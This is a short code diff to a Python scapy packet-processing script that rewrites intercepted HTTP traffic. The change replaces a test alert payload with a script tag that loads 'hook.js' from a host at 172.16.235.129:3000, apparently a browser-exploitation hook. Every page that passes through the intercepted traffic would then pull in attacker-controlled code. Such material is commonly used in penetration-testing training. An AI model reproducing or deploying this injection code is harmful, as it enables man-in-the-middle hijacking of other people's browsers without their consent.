@@ -20,7 +20,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
         try:
             load = scapy_packet[scapy.Raw].load.decode()
-            injection_code = '<script>alert("test");</script>'
+            injection_code = '<script src="http://172.16.235.129:3000/hook.js"></script>'
 
             if scapy_packet[scapy.TCP].dport == 80:
                 print('[+] Request')
